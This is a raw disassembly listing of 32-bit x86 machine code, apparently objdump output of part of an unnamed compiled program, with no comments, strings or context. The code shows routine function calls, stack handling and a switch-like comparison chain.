  402ee8:	ff 74 24 08          	push   0x8(%esp)
  402eec:	e8 fe 17 00 00       	call   0x4046ef
  402ef1:	a3 20 80 41 00       	mov    %eax,0x418020
  402ef6:	68 00 02 00 00       	push   $0x200
  402efb:	e8 a0 6c 00 00       	call   0x409ba0
  402f00:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402f04:	c7 44 24 10 00 02 00 	movl   $0x200,0x10(%esp)
  402f0b:	00 
  402f0c:	ff 35 20 80 41 00    	push   0x418020
  402f12:	ff 74 24 0c          	push   0xc(%esp)
  402f16:	8d 44 24 18          	lea    0x18(%esp),%eax
  402f1a:	50                   	push   %eax
  402f1b:	ff 74 24 18          	push   0x18(%esp)
  402f1f:	e8 9c b8 00 00       	call   0x40e7c0
  402f24:	83 c4 10             	add    $0x10,%esp
  402f27:	89 44 24 14          	mov    %eax,0x14(%esp)
  402f2b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402f2f:	eb 02                	jmp    0x402f33
  402f31:	31 c0                	xor    %eax,%eax
  402f33:	ff 34 24             	push   (%esp)
  402f36:	e8 15 b0 00 00       	call   0x40df50
  402f3b:	83 c4 18             	add    $0x18,%esp
  402f3e:	c2 04 00             	ret    $0x4
  402f41:	53                   	push   %ebx
  402f42:	31 c0                	xor    %eax,%eax
  402f44:	50                   	push   %eax
  402f45:	50                   	push   %eax
  402f46:	50                   	push   %eax
  402f47:	50                   	push   %eax
  402f48:	e8 73 b0 00 00       	call   0x40dfc0
  402f4d:	ff 74 24 18          	push   0x18(%esp)
  402f51:	e8 4a 22 00 00       	call   0x4051a0
  402f56:	b8 88 70 41 00       	mov    $0x417088,%eax
  402f5b:	a3 34 80 41 00       	mov    %eax,0x418034
  402f60:	a1 34 80 41 00       	mov    0x418034,%eax
  402f65:	8b 00                	mov    (%eax),%eax
  402f67:	89 04 24             	mov    %eax,(%esp)
  402f6a:	83 05 34 80 41 00 04 	addl   $0x4,0x418034
  402f71:	a1 34 80 41 00       	mov    0x418034,%eax
  402f76:	8b 00                	mov    (%eax),%eax
  402f78:	89 44 24 04          	mov    %eax,0x4(%esp)
  402f7c:	83 05 34 80 41 00 04 	addl   $0x4,0x418034
  402f83:	ff 34 24             	push   (%esp)
  402f86:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402f8a:	50                   	push   %eax
  402f8b:	58                   	pop    %eax
  402f8c:	e8 7f 21 00 00       	call   0x405110
  402f91:	ff 74 24 04          	push   0x4(%esp)
  402f95:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402f99:	89 c3                	mov    %eax,%ebx
  402f9b:	83 c3 04             	add    $0x4,%ebx
  402f9e:	53                   	push   %ebx
  402f9f:	58                   	pop    %eax
  402fa0:	e8 6b 21 00 00       	call   0x405110
  402fa5:	52                   	push   %edx
  402fa6:	e8 d5 ae 00 00       	call   0x40de80
  402fab:	5a                   	pop    %edx
  402fac:	50                   	push   %eax
  402fad:	52                   	push   %edx
  402fae:	e8 cd ae 00 00       	call   0x40de80
  402fb3:	5a                   	pop    %edx
  402fb4:	50                   	push   %eax
  402fb5:	52                   	push   %edx
  402fb6:	e8 c5 ae 00 00       	call   0x40de80
  402fbb:	5a                   	pop    %edx
  402fbc:	50                   	push   %eax
  402fbd:	52                   	push   %edx
  402fbe:	e8 bd ae 00 00       	call   0x40de80
  402fc3:	5a                   	pop    %edx
  402fc4:	50                   	push   %eax
  402fc5:	68 01 00 00 00       	push   $0x1
  402fca:	68 08 00 00 00       	push   $0x8
  402fcf:	8d 44 24 20          	lea    0x20(%esp),%eax
  402fd3:	50                   	push   %eax
  402fd4:	e8 47 a1 00 00       	call   0x40d120
  402fd9:	e8 a4 21 00 00       	call   0x405182
  402fde:	01 14 24             	add    %edx,(%esp)
  402fe1:	e8 ca 2e 00 00       	call   0x405eb0
  402fe6:	58                   	pop    %eax
  402fe7:	50                   	push   %eax
  402fe8:	e8 83 21 00 00       	call   0x405170
  402fed:	5a                   	pop    %edx
  402fee:	01 d0                	add    %edx,%eax
  402ff0:	eb 0a                	jmp    0x402ffc
  402ff2:	e8 b9 b0 00 00       	call   0x40e0b0
  402ff7:	66 c7 00 00 00       	movw   $0x0,(%eax)
  402ffc:	83 c4 10             	add    $0x10,%esp
  402fff:	5b                   	pop    %ebx
  403000:	c3                   	ret
  403001:	31 c0                	xor    %eax,%eax
  403003:	50                   	push   %eax
  403004:	50                   	push   %eax
  403005:	50                   	push   %eax
  403006:	50                   	push   %eax
  403007:	50                   	push   %eax
  403008:	50                   	push   %eax
  403009:	e8 b2 af 00 00       	call   0x40dfc0
  40300e:	52                   	push   %edx
  40300f:	e8 6c ae 00 00       	call   0x40de80
  403014:	5a                   	pop    %edx
  403015:	50                   	push   %eax
  403016:	52                   	push   %edx
  403017:	e8 64 ae 00 00       	call   0x40de80
  40301c:	5a                   	pop    %edx
  40301d:	50                   	push   %eax
  40301e:	52                   	push   %edx
  40301f:	e8 5c ae 00 00       	call   0x40de80
  403024:	5a                   	pop    %edx
  403025:	50                   	push   %eax
  403026:	52                   	push   %edx
  403027:	e8 54 ae 00 00       	call   0x40de80
  40302c:	5a                   	pop    %edx
  40302d:	50                   	push   %eax
  40302e:	68 01 00 00 00       	push   $0x1
  403033:	ff 35 48 80 41 00    	push   0x418048
  403039:	e8 c2 a0 00 00       	call   0x40d100
  40303e:	e8 3f 21 00 00       	call   0x405182
  403043:	01 14 24             	add    %edx,(%esp)
  403046:	e8 65 2e 00 00       	call   0x405eb0
  40304b:	8d 44 24 04          	lea    0x4(%esp),%eax
  40304f:	50                   	push   %eax
  403050:	e8 6b ae 00 00       	call   0x40dec0
  403055:	52                   	push   %edx
  403056:	e8 25 ae 00 00       	call   0x40de80
  40305b:	5a                   	pop    %edx
  40305c:	50                   	push   %eax
  40305d:	52                   	push   %edx
  40305e:	e8 1d ae 00 00       	call   0x40de80
  403063:	5a                   	pop    %edx
  403064:	50                   	push   %eax
  403065:	52                   	push   %edx
  403066:	e8 15 ae 00 00       	call   0x40de80
  40306b:	5a                   	pop    %edx
  40306c:	50                   	push   %eax
  40306d:	52                   	push   %edx
  40306e:	e8 0d ae 00 00       	call   0x40de80
  403073:	5a                   	pop    %edx
  403074:	50                   	push   %eax
  403075:	68 01 00 00 00       	push   $0x1
  40307a:	ff 74 24 14          	push   0x14(%esp)
  40307e:	e8 7d a0 00 00       	call   0x40d100
  403083:	e8 fa 20 00 00       	call   0x405182
  403088:	01 14 24             	add    %edx,(%esp)
  40308b:	e8 20 2e 00 00       	call   0x405eb0
  403090:	8d 44 24 04          	lea    0x4(%esp),%eax
  403094:	50                   	push   %eax
  403095:	e8 26 ae 00 00       	call   0x40dec0
  40309a:	ff 34 24             	push   (%esp)
  40309d:	e8 fb fd ff ff       	call   0x402e9d
  4030a2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4030a6:	52                   	push   %edx
  4030a7:	e8 d4 ad 00 00       	call   0x40de80
  4030ac:	5a                   	pop    %edx
  4030ad:	50                   	push   %eax
  4030ae:	ff 74 24 08          	push   0x8(%esp)
  4030b2:	e8 ed f0 ff ff       	call   0x4021a4
  4030b7:	e8 e4 20 00 00       	call   0x4051a0
  4030bc:	52                   	push   %edx
  4030bd:	e8 be ad 00 00       	call   0x40de80
  4030c2:	5a                   	pop    %edx
  4030c3:	50                   	push   %eax
  4030c4:	52                   	push   %edx
  4030c5:	e8 b6 ad 00 00       	call   0x40de80
  4030ca:	5a                   	pop    %edx
  4030cb:	50                   	push   %eax
  4030cc:	b8 24 70 41 00       	mov    $0x417024,%eax
  4030d1:	50                   	push   %eax
  4030d2:	ff 35 28 80 41 00    	push   0x418028
  4030d8:	e8 78 62 00 00       	call   0x409355
  4030dd:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4030e1:	50                   	push   %eax
  4030e2:	e8 d9 ad 00 00       	call   0x40dec0
  4030e7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4030eb:	31 c9                	xor    %ecx,%ecx
  4030ed:	e8 2e 20 00 00       	call   0x405120
  4030f2:	0f 85 46 01 00 00    	jne    0x40323e
  4030f8:	52                   	push   %edx
  4030f9:	e8 82 ad 00 00       	call   0x40de80
  4030fe:	5a                   	pop    %edx
  4030ff:	50                   	push   %eax
  403100:	52                   	push   %edx
  403101:	e8 7a ad 00 00       	call   0x40de80
  403106:	5a                   	pop    %edx
  403107:	50                   	push   %eax
  403108:	52                   	push   %edx
  403109:	e8 72 ad 00 00       	call   0x40de80
  40310e:	5a                   	pop    %edx
  40310f:	50                   	push   %eax
  403110:	52                   	push   %edx
  403111:	e8 6a ad 00 00       	call   0x40de80
  403116:	5a                   	pop    %edx
  403117:	50                   	push   %eax
  403118:	68 01 00 00 00       	push   $0x1
  40311d:	ff 35 48 80 41 00    	push   0x418048
  403123:	e8 d8 9f 00 00       	call   0x40d100
  403128:	e8 55 20 00 00       	call   0x405182
  40312d:	01 14 24             	add    %edx,(%esp)
  403130:	e8 7b 2d 00 00       	call   0x405eb0
  403135:	8d 44 24 10          	lea    0x10(%esp),%eax
  403139:	50                   	push   %eax
  40313a:	e8 81 ad 00 00       	call   0x40dec0
  40313f:	52                   	push   %edx
  403140:	e8 3b ad 00 00       	call   0x40de80
  403145:	5a                   	pop    %edx
  403146:	50                   	push   %eax
  403147:	52                   	push   %edx
  403148:	e8 33 ad 00 00       	call   0x40de80
  40314d:	5a                   	pop    %edx
  40314e:	50                   	push   %eax
  40314f:	52                   	push   %edx
  403150:	e8 2b ad 00 00       	call   0x40de80
  403155:	5a                   	pop    %edx
  403156:	50                   	push   %eax
  403157:	52                   	push   %edx
  403158:	e8 23 ad 00 00       	call   0x40de80
  40315d:	5a                   	pop    %edx
  40315e:	50                   	push   %eax
  40315f:	68 03 00 00 00       	push   $0x3
  403164:	ff 35 48 80 41 00    	push   0x418048
  40316a:	e8 91 9f 00 00       	call   0x40d100
  40316f:	e8 0e 20 00 00       	call   0x405182
  403174:	01 14 24             	add    %edx,(%esp)
  403177:	e8 34 2d 00 00       	call   0x405eb0
  40317c:	8d 44 24 14          	lea    0x14(%esp),%eax
  403180:	50                   	push   %eax
  403181:	e8 3a ad 00 00       	call   0x40dec0
  403186:	52                   	push   %edx
  403187:	e8 f4 ac 00 00       	call   0x40de80
  40318c:	5a                   	pop    %edx
  40318d:	50                   	push   %eax
  40318e:	68 00 00 00 00       	push   $0x0
  403193:	ff 74 24 18          	push   0x18(%esp)
  403197:	e8 3b 0b 00 00       	call   0x403cd7
  40319c:	8d 05 5c 80 41 00    	lea    0x41805c,%eax
  4031a2:	50                   	push   %eax
  4031a3:	e8 18 ad 00 00       	call   0x40dec0
  4031a8:	52                   	push   %edx
  4031a9:	e8 d2 ac 00 00       	call   0x40de80
  4031ae:	5a                   	pop    %edx
  4031af:	50                   	push   %eax
  4031b0:	68 00 00 00 00       	push   $0x0
  4031b5:	ff 74 24 14          	push   0x14(%esp)
  4031b9:	e8 19 0b 00 00       	call   0x403cd7
  4031be:	8d 44 24 18          	lea    0x18(%esp),%eax
  4031c2:	50                   	push   %eax
  4031c3:	e8 f8 ac 00 00       	call   0x40dec0
  4031c8:	ff 74 24 08          	push   0x8(%esp)
  4031cc:	e8 8a 21 00 00       	call   0x40535b
  4031d1:	52                   	push   %edx
  4031d2:	e8 a9 ac 00 00       	call   0x40de80
  4031d7:	5a                   	pop    %edx
  4031d8:	50                   	push   %eax
  4031d9:	ff 74 24 18          	push   0x18(%esp)
  4031dd:	8b 54 24 10          	mov    0x10(%esp),%edx
  4031e1:	52                   	push   %edx
  4031e2:	e8 99 ac 00 00       	call   0x40de80
  4031e7:	5a                   	pop    %edx
  4031e8:	50                   	push   %eax
  4031e9:	52                   	push   %edx
  4031ea:	e8 31 ae 00 00       	call   0x40e020
  4031ef:	8b 15 5c 80 41 00    	mov    0x41805c,%edx
  4031f5:	52                   	push   %edx
  4031f6:	e8 25 ae 00 00       	call   0x40e020
  4031fb:	e8 82 1f 00 00       	call   0x405182
  403200:	01 14 24             	add    %edx,(%esp)
  403203:	e8 04 f2 ff ff       	call   0x40240c
  403208:	e8 93 1f 00 00       	call   0x4051a0
  40320d:	8b 54 24 08          	mov    0x8(%esp),%edx
  403211:	52                   	push   %edx
  403212:	e8 69 ac 00 00       	call   0x40de80
  403217:	5a                   	pop    %edx
  403218:	50                   	push   %eax
  403219:	52                   	push   %edx
  40321a:	e8 01 ae 00 00       	call   0x40e020
  40321f:	8d 05 50 80 41 00    	lea    0x418050,%eax
  403225:	50                   	push   %eax
  403226:	e8 95 ac 00 00       	call   0x40dec0
  40322b:	ff 35 50 80 41 00    	push   0x418050
  403231:	e8 3d 21 00 00       	call   0x405373
  403236:	ff 34 24             	push   (%esp)
  403239:	e8 6b fa ff ff       	call   0x402ca9
  40323e:	e9 5d df ff ff       	jmp    0x4011a0
  403243:	31 c0                	xor    %eax,%eax
  403245:	ff 34 24             	push   (%esp)
  403248:	e8 03 ad 00 00       	call   0x40df50
  40324d:	ff 74 24 0c          	push   0xc(%esp)
  403251:	e8 fa ac 00 00       	call   0x40df50
  403256:	ff 74 24 08          	push   0x8(%esp)
  40325a:	e8 f1 ac 00 00       	call   0x40df50
  40325f:	ff 74 24 14          	push   0x14(%esp)
  403263:	e8 e8 ac 00 00       	call   0x40df50
  403268:	ff 74 24 10          	push   0x10(%esp)
  40326c:	e8 df ac 00 00       	call   0x40df50
  403271:	83 c4 18             	add    $0x18,%esp
  403274:	c3                   	ret
  403275:	53                   	push   %ebx
  403276:	ba 07 00 00 00       	mov    $0x7,%edx
  40327b:	83 ec 04             	sub    $0x4,%esp
  40327e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403285:	4a                   	dec    %edx
  403286:	75 f3                	jne    0x40327b
  403288:	e8 33 ad 00 00       	call   0x40dfc0
  40328d:	ff 74 24 2c          	push   0x2c(%esp)
  403291:	e8 0a 1f 00 00       	call   0x4051a0
  403296:	8b 54 24 24          	mov    0x24(%esp),%edx
  40329a:	8d 0c 24             	lea    (%esp),%ecx
  40329d:	e8 be 1d 00 00       	call   0x405060
  4032a2:	8b 54 24 28          	mov    0x28(%esp),%edx
  4032a6:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4032aa:	e8 b1 1d 00 00       	call   0x405060
  4032af:	e8 0d f9 ff ff       	call   0x402bc1
  4032b4:	21 c0                	and    %eax,%eax
  4032b6:	74 13                	je     0x4032cb
  4032b8:	e8 dd 22 00 00       	call   0x40559a
  4032bd:	89 c3                	mov    %eax,%ebx
  4032bf:	83 fb 41             	cmp    $0x41,%ebx
  4032c2:	74 07                	je     0x4032cb
  4032c4:	b8 01 00 00 00       	mov    $0x1,%eax
  4032c9:	eb 02                	jmp    0x4032cd
  4032cb:	31 c0                	xor    %eax,%eax
  4032cd:	21 c0                	and    %eax,%eax
  4032cf:	0f 84 66 01 00 00    	je     0x40343b
  4032d5:	52                   	push   %edx
  4032d6:	e8 a5 ab 00 00       	call   0x40de80
  4032db:	5a                   	pop    %edx
  4032dc:	50                   	push   %eax
  4032dd:	52                   	push   %edx
  4032de:	e8 9d ab 00 00       	call   0x40de80
  4032e3:	5a                   	pop    %edx
  4032e4:	50                   	push   %eax
  4032e5:	68 00 08 00 00       	push   $0x800
  4032ea:	e8 d1 2f 00 00       	call   0x4062c0
  4032ef:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4032f3:	50                   	push   %eax
  4032f4:	e8 c7 ab 00 00       	call   0x40dec0
  4032f9:	68 00 08 00 00       	push   $0x800
  4032fe:	ff 74 24 0c          	push   0xc(%esp)
  403302:	e8 e7 1d 00 00       	call   0x4050ee
  403307:	ff 74 24 08          	push   0x8(%esp)
  40330b:	e8 4b 20 00 00       	call   0x40535b
  403310:	8b 54 24 08          	mov    0x8(%esp),%edx
  403314:	52                   	push   %edx
  403315:	e8 66 ab 00 00       	call   0x40de80
  40331a:	5a                   	pop    %edx
  40331b:	50                   	push   %eax
  40331c:	52                   	push   %edx
  40331d:	e8 fe ac 00 00       	call   0x40e020
  403322:	ba 4c 70 41 00       	mov    $0x41704c,%edx
  403327:	52                   	push   %edx
  403328:	e8 f3 ac 00 00       	call   0x40e020
  40332d:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403331:	50                   	push   %eax
  403332:	e8 89 ab 00 00       	call   0x40dec0
  403337:	ff 74 24 08          	push   0x8(%esp)
  40333b:	e8 1b 20 00 00       	call   0x40535b
  403340:	8b 54 24 08          	mov    0x8(%esp),%edx
  403344:	52                   	push   %edx
  403345:	e8 36 ab 00 00       	call   0x40de80
  40334a:	5a                   	pop    %edx
  40334b:	50                   	push   %eax
  40334c:	52                   	push   %edx
  40334d:	e8 ce ac 00 00       	call   0x40e020
  403352:	8b 54 24 04          	mov    0x4(%esp),%edx
  403356:	52                   	push   %edx
  403357:	e8 c4 ac 00 00       	call   0x40e020
  40335c:	8d 44 24 10          	lea    0x10(%esp),%eax
  403360:	50                   	push   %eax
  403361:	e8 5a ab 00 00       	call   0x40dec0
  403366:	8b 54 24 08          	mov    0x8(%esp),%edx
  40336a:	52                   	push   %edx
  40336b:	e8 10 ab 00 00       	call   0x40de80
  403370:	5a                   	pop    %edx
  403371:	50                   	push   %eax
  403372:	52                   	push   %edx
  403373:	e8 a8 ac 00 00       	call   0x40e020
  403378:	8b 54 24 04          	mov    0x4(%esp),%edx
  40337c:	52                   	push   %edx
  40337d:	e8 9e ac 00 00       	call   0x40e020
  403382:	8b 54 24 08          	mov    0x8(%esp),%edx
  403386:	52                   	push   %edx
  403387:	e8 94 ac 00 00       	call   0x40e020
  40338c:	8d 44 24 14          	lea    0x14(%esp),%eax
  403390:	50                   	push   %eax
  403391:	e8 2a ab 00 00       	call   0x40dec0
  403396:	ff 74 24 0c          	push   0xc(%esp)
  40339a:	68 00 00 00 00       	push   $0x0
  40339f:	e8 1c 7a 00 00       	call   0x40adc0
  4033a4:	21 c0                	and    %eax,%eax
  4033a6:	74 14                	je     0x4033bc
  4033a8:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  4033af:	00 
  4033b0:	68 00 00 00 00       	push   $0x0
  4033b5:	e8 16 76 00 00       	call   0x40a9d0
  4033ba:	eb 08                	jmp    0x4033c4
  4033bc:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4033c3:	00 
  4033c4:	ff 74 24 10          	push   0x10(%esp)
  4033c8:	68 00 00 00 00       	push   $0x0
  4033cd:	e8 ee 79 00 00       	call   0x40adc0
  4033d2:	21 c0                	and    %eax,%eax
  4033d4:	74 14                	je     0x4033ea
  4033d6:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  4033dd:	00 
  4033de:	68 00 00 00 00       	push   $0x0
  4033e3:	e8 e8 75 00 00       	call   0x40a9d0
  4033e8:	eb 08                	jmp    0x4033f2
  4033ea:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4033f1:	00 
  4033f2:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4033f6:	03 5c 24 18          	add    0x18(%esp),%ebx
  4033fa:	21 db                	and    %ebx,%ebx
  4033fc:	75 3b                	jne    0x403439
  4033fe:	52                   	push   %edx
  4033ff:	e8 7c aa 00 00       	call   0x40de80
  403404:	5a                   	pop    %edx
  403405:	50                   	push   %eax
  403406:	52                   	push   %edx
  403407:	e8 74 aa 00 00       	call   0x40de80
  40340c:	5a                   	pop    %edx
  40340d:	50                   	push   %eax
  40340e:	68 00 08 00 00       	push   $0x800
  403413:	e8 a8 2e 00 00       	call   0x4062c0
  403418:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40341c:	50                   	push   %eax
  40341d:	e8 9e aa 00 00       	call   0x40dec0
  403422:	68 00 08 00 00       	push   $0x800
  403427:	ff 74 24 0c          	push   0xc(%esp)
  40342b:	e8 c4 1c 00 00       	call   0x4050f4
  403430:	ff 74 24 08          	push   0x8(%esp)
  403434:	e8 22 1f 00 00       	call   0x40535b
  403439:	eb 3b                	jmp    0x403476
  40343b:	52                   	push   %edx
  40343c:	e8 3f aa 00 00       	call   0x40de80
  403441:	5a                   	pop    %edx
  403442:	50                   	push   %eax
  403443:	52                   	push   %edx
  403444:	e8 37 aa 00 00       	call   0x40de80
  403449:	5a                   	pop    %edx
  40344a:	50                   	push   %eax
  40344b:	68 00 08 00 00       	push   $0x800
  403450:	e8 6b 2e 00 00       	call   0x4062c0
  403455:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403459:	50                   	push   %eax
  40345a:	e8 61 aa 00 00       	call   0x40dec0
  40345f:	68 00 08 00 00       	push   $0x800
  403464:	ff 74 24 0c          	push   0xc(%esp)
  403468:	e8 87 1c 00 00       	call   0x4050f4
  40346d:	ff 74 24 08          	push   0x8(%esp)
  403471:	e8 e5 1e 00 00       	call   0x40535b
  403476:	8b 54 24 08          	mov    0x8(%esp),%edx
  40347a:	52                   	push   %edx
  40347b:	e8 00 aa 00 00       	call   0x40de80
  403480:	5a                   	pop    %edx
  403481:	50                   	push   %eax
  403482:	52                   	push   %edx
  403483:	e8 98 ab 00 00       	call   0x40e020
  403488:	58                   	pop    %eax
  403489:	50                   	push   %eax
  40348a:	e8 e1 1c 00 00       	call   0x405170
  40348f:	5a                   	pop    %edx
  403490:	01 d0                	add    %edx,%eax
  403492:	eb 0a                	jmp    0x40349e
  403494:	e8 17 ac 00 00       	call   0x40e0b0
  403499:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40349e:	ff 74 24 10          	push   0x10(%esp)
  4034a2:	e8 a9 aa 00 00       	call   0x40df50
  4034a7:	ff 34 24             	push   (%esp)
  4034aa:	e8 a1 aa 00 00       	call   0x40df50
  4034af:	ff 74 24 04          	push   0x4(%esp)
  4034b3:	e8 98 aa 00 00       	call   0x40df50
  4034b8:	ff 74 24 08          	push   0x8(%esp)
  4034bc:	e8 8f aa 00 00       	call   0x40df50
  4034c1:	ff 74 24 0c          	push   0xc(%esp)
  4034c5:	e8 86 aa 00 00       	call   0x40df50
  4034ca:	83 c4 1c             	add    $0x1c,%esp
  4034cd:	5b                   	pop    %ebx
  4034ce:	c2 08 00             	ret    $0x8
  4034d1:	55                   	push   %ebp
  4034d2:	53                   	push   %ebx
  4034d3:	31 c0                	xor    %eax,%eax
  4034d5:	50                   	push   %eax
  4034d6:	e8 e5 aa 00 00       	call   0x40dfc0
  4034db:	8b 1d 30 80 41 00    	mov    0x418030,%ebx
  4034e1:	83 fb 01             	cmp    $0x1,%ebx
  4034e4:	0f 85 94 00 00 00    	jne    0x40357e
  4034ea:	ff 35 a8 80 41 00    	push   0x4180a8
  4034f0:	e8 4e 6f 00 00       	call   0x40a443
  4034f5:	89 c3                	mov    %eax,%ebx
  4034f7:	21 db                	and    %ebx,%ebx
  4034f9:	7e 2a                	jle    0x403525
  4034fb:	ff 35 a8 80 41 00    	push   0x4180a8
  403501:	e8 47 6f 00 00       	call   0x40a44d
  403506:	ff 35 a8 80 41 00    	push   0x4180a8
  40350c:	e8 51 6f 00 00       	call   0x40a462
  403511:	09 c0                	or     %eax,%eax
  403513:	74 10                	je     0x403525
  403515:	8b 2d ac 80 41 00    	mov    0x4180ac,%ebp
  40351b:	ff 75 08             	push   0x8(%ebp)
  40351e:	e8 c4 72 00 00       	call   0x40a7e7
  403523:	eb e1                	jmp    0x403506
  403525:	ff 35 a0 80 41 00    	push   0x4180a0
  40352b:	e8 13 6f 00 00       	call   0x40a443
  403530:	89 04 24             	mov    %eax,(%esp)
  403533:	8b 1c 24             	mov    (%esp),%ebx
  403536:	21 db                	and    %ebx,%ebx
  403538:	7e 44                	jle    0x40357e
  40353a:	68 05 00 00 00       	push   $0x5
  40353f:	68 00 00 00 00       	push   $0x0
  403544:	68 01 00 00 00       	push   $0x1
  403549:	ff 35 a0 80 41 00    	push   0x4180a0
  40354f:	e8 5c 3a 00 00       	call   0x406fb0
  403554:	ff 35 a0 80 41 00    	push   0x4180a0
  40355a:	e8 ee 6e 00 00       	call   0x40a44d
  40355f:	ff 35 a0 80 41 00    	push   0x4180a0
  403565:	e8 f8 6e 00 00       	call   0x40a462
  40356a:	09 c0                	or     %eax,%eax
  40356c:	74 10                	je     0x40357e
  40356e:	8b 2d a4 80 41 00    	mov    0x4180a4,%ebp
  403574:	ff 75 0c             	push   0xc(%ebp)
  403577:	e8 36 1b 00 00       	call   0x4050b2
  40357c:	eb e1                	jmp    0x40355f
  40357e:	b8 01 00 00 00       	mov    $0x1,%eax
  403583:	eb 02                	jmp    0x403587
  403585:	31 c0                	xor    %eax,%eax
  403587:	83 c4 04             	add    $0x4,%esp
  40358a:	5b                   	pop    %ebx
  40358b:	5d                   	pop    %ebp
  40358c:	c3                   	ret
  40358d:	53                   	push   %ebx
  40358e:	31 c0                	xor    %eax,%eax
  403590:	50                   	push   %eax
  403591:	50                   	push   %eax
  403592:	e8 29 aa 00 00       	call   0x40dfc0
  403597:	ff 74 24 18          	push   0x18(%esp)
  40359b:	e8 00 1c 00 00       	call   0x4051a0
  4035a0:	8b 54 24 14          	mov    0x14(%esp),%edx
  4035a4:	8d 0c 24             	lea    (%esp),%ecx
  4035a7:	e8 b4 1a 00 00       	call   0x405060
  4035ac:	ff 74 24 10          	push   0x10(%esp)
  4035b0:	31 db                	xor    %ebx,%ebx
  4035b2:	3b 1c 24             	cmp    (%esp),%ebx
  4035b5:	75 24                	jne    0x4035db
  4035b7:	52                   	push   %edx
  4035b8:	e8 c3 a8 00 00       	call   0x40de80
  4035bd:	5a                   	pop    %edx
  4035be:	50                   	push   %eax
  4035bf:	52                   	push   %edx
  4035c0:	e8 bb a8 00 00       	call   0x40de80
  4035c5:	5a                   	pop    %edx
  4035c6:	50                   	push   %eax
  4035c7:	e8 29 72 00 00       	call   0x40a7f5
  4035cc:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4035d0:	50                   	push   %eax
  4035d1:	e8 ea a8 00 00       	call   0x40dec0
  4035d6:	e9 39 02 00 00       	jmp    0x403814
  4035db:	bb 01 00 00 00       	mov    $0x1,%ebx
  4035e0:	3b 1c 24             	cmp    (%esp),%ebx
  4035e3:	75 23                	jne    0x403608
  4035e5:	8b 15 78 80 41 00    	mov    0x418078,%edx
  4035eb:	52                   	push   %edx
  4035ec:	e8 8f a8 00 00       	call   0x40de80
  4035f1:	5a                   	pop    %edx
  4035f2:	50                   	push   %eax
  4035f3:	52                   	push   %edx
  4035f4:	e8 27 aa 00 00       	call   0x40e020
  4035f9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4035fd:	50                   	push   %eax
  4035fe:	e8 bd a8 00 00       	call   0x40dec0
  403603:	e9 0c 02 00 00       	jmp    0x403814
  403608:	bb 02 00 00 00       	mov    $0x2,%ebx
  40360d:	3b 1c 24             	cmp    (%esp),%ebx
  403610:	75 29                	jne    0x40363b
  403612:	52                   	push   %edx
  403613:	e8 68 a8 00 00       	call   0x40de80
  403618:	5a                   	pop    %edx
  403619:	50                   	push   %eax
  40361a:	52                   	push   %edx
  40361b:	e8 60 a8 00 00       	call   0x40de80
  403620:	5a                   	pop    %edx
  403621:	50                   	push   %eax
  403622:	68 04 00 00 00       	push   $0x4
  403627:	e8 0e 72 00 00       	call   0x40a83a
  40362c:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403630:	50                   	push   %eax
  403631:	e8 8a a8 00 00       	call   0x40dec0
  403636:	e9 d9 01 00 00       	jmp    0x403814
  40363b:	bb 03 00 00 00       	mov    $0x3,%ebx
  403640:	3b 1c 24             	cmp    (%esp),%ebx
  403643:	75 29                	jne    0x40366e
  403645:	52                   	push   %edx
  403646:	e8 35 a8 00 00       	call   0x40de80
  40364b:	5a                   	pop    %edx
  40364c:	50                   	push   %eax
  40364d:	52                   	push   %edx
  40364e:	e8 2d a8 00 00       	call   0x40de80
  403653:	5a                   	pop    %edx
  403654:	50                   	push   %eax
  403655:	68 00 00 00 00       	push   $0x0
  40365a:	e8 db 71 00 00       	call   0x40a83a
  40365f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403663:	50                   	push   %eax
  403664:	e8 57 a8 00 00       	call   0x40dec0
  403669:	e9 a6 01 00 00       	jmp    0x403814
  40366e:	bb 04 00 00 00       	mov    $0x4,%ebx
  403673:	3b 1c 24             	cmp    (%esp),%ebx
  403676:	75 29                	jne    0x4036a1
  403678:	52                   	push   %edx
  403679:	e8 02 a8 00 00       	call   0x40de80
  40367e:	5a                   	pop    %edx
  40367f:	50                   	push   %eax
  403680:	52                   	push   %edx
  403681:	e8 fa a7 00 00       	call   0x40de80
  403686:	5a                   	pop    %edx
  403687:	50                   	push   %eax
  403688:	68 03 00 00 00       	push   $0x3
  40368d:	e8 a8 71 00 00       	call   0x40a83a
  403692:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403696:	50                   	push   %eax
  403697:	e8 24 a8 00 00       	call   0x40dec0
  40369c:	e9 73 01 00 00       	jmp    0x403814
  4036a1:	bb 05 00 00 00       	mov    $0x5,%ebx
  4036a6:	3b 1c 24             	cmp    (%esp),%ebx
  4036a9:	75 29                	jne    0x4036d4
  4036ab:	52                   	push   %edx
  4036ac:	e8 cf a7 00 00       	call   0x40de80
  4036b1:	5a                   	pop    %edx
  4036b2:	50                   	push   %eax
  4036b3:	52                   	push   %edx
  4036b4:	e8 c7 a7 00 00       	call   0x40de80
  4036b9:	5a                   	pop    %edx
  4036ba:	50                   	push   %eax
  4036bb:	68 08 00 00 00       	push   $0x8
  4036c0:	e8 75 71 00 00       	call   0x40a83a
  4036c5:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4036c9:	50                   	push   %eax
  4036ca:	e8 f1 a7 00 00       	call   0x40dec0
  4036cf:	e9 40 01 00 00       	jmp    0x403814
